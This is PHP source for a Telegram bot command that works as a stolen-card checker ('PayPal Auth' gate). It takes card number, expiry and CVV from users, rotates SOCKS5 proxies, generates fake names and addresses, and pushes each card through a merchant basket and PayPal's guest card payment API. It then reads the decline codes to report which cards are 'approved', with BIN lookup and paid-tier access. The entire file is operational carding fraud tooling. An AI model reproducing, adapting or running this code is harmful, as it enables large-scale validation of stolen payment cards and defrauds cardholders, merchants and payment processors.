<?php
if(strpos($message, '!ko') === 0 or strpos($message, '/ko') === 0 or strpos($message, '.ko') === 0){
    sendaction($chatId, typing);
$NameGater ='PP Auth';
$gateway = '/ko :'.$NameGater;
is_gateroff($NameGater); //off Gater
is_premium(); // true ´Premium
deleteprm($userId); // delete Premium
Contador($gateway);

IS_BANNED($userId,$chatId,$message_id);
sendaction($chatId, typing);

deleteprm($userId);

$lista = substr($message, 4);

if(empty($lista)){
$lista = $r_msg;
}if(empty($lista)){
$lista = $q_msg;}

if(empty($lista)){
bot('sendMessage', [
                'chat_id' =>$chatId,
                'disable_web_page_preview' => true,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>[<a href='https://example.invalid/legacy'>ϟ</a>] Gate Auth: >_ $-Security System ⚠️
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Pasarela: <code>Paypal Auth</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Status: <code>ONLINE! 🟩</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Format: <code>!ko card|month|year|cvv</code>
━━━━━━━━━━━━━━━━</b>"
                ]);
        die();
}

$tiempo_inicial = microtime(true);

$card = json_encode(Parser1($lista));
$card = json_decode($card, true);
$cc = $card["card"];
$mes = $card["MES"];
$ano = $card["ANO"];
$cvv = $card["CVV"];
$valid = $card["valid"];


if($valid == "ERROR"){
reply_to($chatId,$message_id,$keyboard,"<b>Invalid format</b>");
die();
}

if(bannedbin(substr($cc, 0,6)) == true){
reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
exit();
}

if ($gId == $Mi_Id) $Rank = "Owner";
elseif (verifiAdmin($userId)) $Rank = "Admin";
elseif (veritimepremium($userId)) $Rank = infouser($userId)['apodo'];
elseif (verifiCharAdmin($chatId)) $Rank = "Free User";
elseif (verifiUser($userId)) $Rank = "Free user";

is_Antispma($userId, $chatId, $messageId, $keyboard);
    
    
$res = bininfo(substr($cc, 0,6));
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];

if($scheme == 'PREPAID'){
reply_to($chatId,$message_id,$keyboard,"<b>Bin PREPAID Banned</b>.");
die();
}

$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
    'disable_web_page_preview' => true,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>[<a href='https://example.invalid/legacy'>ϟ</a>] Gate Auth: >_ $-Paypal
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Status: <code>WAIT A FEW SECONDS 🟥</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>"
]);

$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');

antisppre($userId); //Premium
antispFree($userId); //Free User

# ------------ Ramdom User ------------ #


$retry = 0;
	

start:
if($retry > 3)
{
    bot('editMessageText',[
    'chat_id'=>$chatId,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>Error Proxy</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);
return;
}

$rotate = rotate();
$socks5 = socks5();

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://example.invalid/legacy');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$curl = curl_exec($ch);
if(empty($curl)){
  $retry++;
  goto start; 
}



//////////////////////=[Proxy Section]=///////////////// 


$url = 'https://example.invalid/legacy';
$r_1Fk = Curlx::Get($url,NULL,NULL,NULL)->body;
$first = Curlx::ParseString($r_1Fk ,'"first":"','"');
$last = Curlx::ParseString($r_1Fk ,'"last":"','"');
$phone = (Curlx::ParseString($r_1Fk ,'"phone":"','"'));
$email = Curlx::ParseString($r_1Fk ,'"email":"','"');
$serve_arr = array("gmail.com","hotmail.com","yahoo.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= (str_replace("example.com", $serv_rnd, $email));

$url = 'https://example.invalid/legacy';
$r_2Fk = Curlx::Get($url,NULL,NULL,NULL)->body;
$streets = trim(strip_tags(Curlx::ParseString($r_2Fk,'<td>Street','</tr>')));
$citys = ucfirst(strtolower(trim(strip_tags(Curlx::ParseString($r_2Fk,'<td>City','</tr>')))));
$statess = trim(strip_tags(Curlx::ParseString($r_2Fk,'<td>State/Province abbr','</b></td>')));
$states = trim(strip_tags(Curlx::ParseString($r_2Fk,'<td>State/Province full','</b></td>')));
$postcodes = trim(strip_tags(Curlx::ParseString($r_2Fk,'<td>Zip Code/Postal code','</tr>')));

$PRX = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];
$IDcookie = uniqid();

$url = 'https://example.invalid/legacy';
$postdata = 'id=&quantity=1&variation%5B%5D=200001176%3A200021498&variation%5B%5D=200007763%3A201336103&variation%5B%5D=491%3A200006086&title=&post_id=63236&shipping=free&action=ads_actions_basket&ads_actions=add&discount=';
$post = Curlx::Post($url,$postdata, NULL ,$IDcookie , $PRX)->body;

$url = 'https://example.invalid/legacy';
$get = Curlx::Get($url, NULL, $IDcookie,$PRX)->body;



$sdkCorrelationID = CorreLatidBraintre(14);
$storageID = CorreLatidBraintre(7);
$sessionID = CorreLatidBraintre(7);
$buttonSessionID = CorreLatidBraintre(7);





$url = 'https://example.invalid/legacy'.$sdkCorrelationID.'&storageID=uid_'.$storageID.'_mdi6mzu6mzm&sessionID=uid_'.$sessionID.'_mdi6mzu6mzm&buttonSessionID=uid_'.$buttonSessionID.'_mdi6mzu6mzu&env=production&fundingEligibility=REDACTED_OPAQUE_LITERAL&platform=desktop&experiment.enableVenmo=false&experiment.enableVenmoAppLabel=false&flow=purchase&currency=USD&intent=capture&commit=true&vault=false&renderedButtons.0=paypal&renderedButtons.1=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=false&allowBillingPayments=true&disableSetCookie=false';
$get = Curlx::Get($url, NULL, $IDcookie,null)->body;
$bearer = (Curlx::ParseString($get, '"facilitatorAccessToken":"', '"'));


$url = 'https://example.invalid/legacy';
$headers = array();
$headers[] = 'Host: www.paypal.com';
$headers[] = 'Connection: keep-alive';
$headers[] = 'authorization: Bearer '.$bearer.'';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36';
$headers[] = 'content-type: application/json';
$headers[] = 'accept: application/json';
$headers[] = 'paypal-partner-attribution-id: ';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'Origin: https://example.invalid/legacy';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';


$postdata = '{"purchase_units":[{"reference_id":"VAL-N9G7LPBZ003B-basket","amount":{"currency_code":"USD","value":11.72},"description":"Value Deels order"}],"intent":"CAPTURE","application_context":{}}';

$post = Curlx::Post($url,$postdata, $headers ,$IDcookie , null)->body;
$Token = (Curlx::ParseString($post, '"id":"', '",'));

$url = 'https://example.invalid/legacy';
$headers = array();
$headers[] = 'Host: www.paypal.com';
$headers[] = 'Connection: keep-alive';
$headers[] = 'paypal-client-metadata-id: '.$Token.'';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36';
$headers[] = 'paypal-client-context: '.$Token.'';
$headers[] = 'content-type: application/json';
$headers[] = 'x-country: US';
$headers[] = 'x-app-name: standardcardfields';
$headers[] = 'Accept: */*';
$headers[] = 'Origin: https://example.invalid/legacy';


$postdata = '{"query":"\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ","variables":{"token":"'.$Token.'","card":{"cardNumber":"'.$cc.'","expirationDate":"'.$mes.'/'.$ano.'","postalCode":"10010","securityCode":"'.$cvv.'"},"phoneNumber":"'.$phone.'","firstName":"'.$first.'","lastName":"'.$last.'","billingAddress":{"givenName":"'.$first.'","familyName":"'.$last.'","line1":"'.$streets.'","line2":null,"city":"'.$citys.'","state":"'.$statess.'","postalCode":"'.$postcodes.'","country":"US"},"shippingAddress":{"givenName":"'.$first.'","familyName":"'.$last.'","line1":"'.$streets.'","line2":null,"city":"'.$citys.'","state":"'.$statess.'","postalCode":"'.$postcodes.'","country":"US"},"email":"'.$email.'","currencyConversionType":"PAYPAL"},"operationName":null}';
$result2 = Curlx::Post($url,$postdata, $headers ,$IDcookie , null)->body;
$mgs = trim(strip_tags(Curlx::ParseString($result2, '"code":"', '"')));  
$mgs1 = trim(strip_tags(Curlx::ParseString($result2, '"message":"', '"'))); 
$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);
if(strlen($mes) == 1){
    $mes = '0'.$mes;
}

bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://example.invalid/legacy'>ϟ</a>] Gate Auth: >_ $-Paypal
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Status: <code>ALMOST FINISHED 🟩</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);

if ((strpos($result2, "INVALID_SECURITY_CODE")) || (strpos($result2, "incorrect_cvc")) || (strpos($result2, "The card's security code is incorrect."))){
$status = "Approved! 🟩";
$response = "Auth Success 🟩";
}elseif ((strpos($result2, 'INVALID_BILLING_ADDRESS')) || (strpos($result2, 'insufficient_funds'))){ 
$status = "Approved!🟩";
$response = "Auth Success 🟩";
}elseif (strpos($result, "EXISTING_ACCOUNT_RESTRICTED")){ 
$status = "Approved!🟩";
$response = "Auth Success 🟩";
}elseif (strpos($result2, "EXISTING_ACCOUNT_RESTRICTED")){ 
$status = "Approved!🟩";
$response = "Auth Success 🟩";
}elseif (strpos($result2, "do_not_honor")){ 
$status = "Declined! 🔴";
$response = "do_not_honor";
}elseif (strpos($result2, 'he transaction total has been updated to reflect added tax based on your shipping country. Please review the new total and confirm your payment.') || (strpos($result2,"Verification steps confirmed. Your payment is processing"))) {
    $status = "Approved!🟩";
    $code = "Approved!🟩";
    $response = "Card Approved🟩";
}
elseif (strpos($result2, '"intent":"SALE')){ 
$status = "Approved! 🟩";
$response = "Auth Success 🟩";
bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://example.invalid/legacy'>ϟ</a>] Gate Auth: >_ $-Paypal
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
[<a href='https://example.invalid/legacy'>ϟ</a>] Status: <code>$status</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Response: <code>$response</code>
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Card Check info: Proxy's: <code>Live ✅</code> 
[<a href='https://example.invalid/legacy'>ϟ</a>] Time: <code>$tiempo</code> | Gate: <code>$NameGater</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);
return;
}elseif ((strpos($result2, "Your card does not support this type of purchase.")) || (strpos($result2, "transaction_not_allowed"))){
    $status = "<b>CARD DECLINED ❌</b>";
    $response = "Your card does not support this type of purchase🟥";
}elseif ((strpos($result2, "pickup_card")) || (strpos($result2, "lost_card")) || (strpos($result2, "stolen_card"))){
    $status = "<b>CARD DECLINED ❌</b>";
    $response = "<b>LOST CARD</b>";
  }
  elseif ((strpos($result2, "fraudulent")) || (strpos($result2, "lost_card")) || (strpos($result2, "fraudulent card"))){
    $status = "<b>Declined! 🔴</b>";
    $response = "<b>FRAUDULENT CARD</b>";
  }elseif ((strpos($result2, 'NEED_CREDIT_CARD')) || (strpos($result1, 'expired_card'))){
    $status = "<b>Declined! 🔴</b>";
    $code = "NON_PAYABLE 🔴 ";
    $response = "<b>NEED_CREDIT_CARD</b>";
  }
  elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'Call to a member function')) || (strpos($result2, 'incorrect_number'))){
    $status = "<b>INVALID CARD ❌</b>";
    $response = "<b>INCORRECT NUMBER</b>";
  }
  elseif ((strpos($result2, 'Sorry, there was an error completing your purchase -- please try again.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'Call to a member function')) || (strpos($result2, 'incorrect_number'))){
    $status = "<b>Declined! 🔴</b>";
    $response = "<b>try again</b>";
  }
  elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'incorrect-number')) || (strpos($result2, 'incorrect_number'))){
$status = "<b>Declined! 🔴</b>";
$response = "<b>INCORRECT NUMBER</b>";
}elseif (strpos($result2, "generic_decline")){
$status = "<b>Declined! 🔴</b>";
$response = "<b>GENERIC DECLINE</b>";
}else{
$status = "Declined! 🔴";
$response = "$mgs1";
}

bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://example.invalid/legacy'>ϟ</a>] Gate Auth: >_ $-Paypal
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
[<a href='https://example.invalid/legacy'>ϟ</a>] Status: <code>$status</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Response: <code>$response</code>
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Card Check info: Proxy's: <code>Live ✅</code> 
[<a href='https://example.invalid/legacy'>ϟ</a>] Time: <code>$tiempo</code> | Gate: <code>$NameGater</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);

}

?>

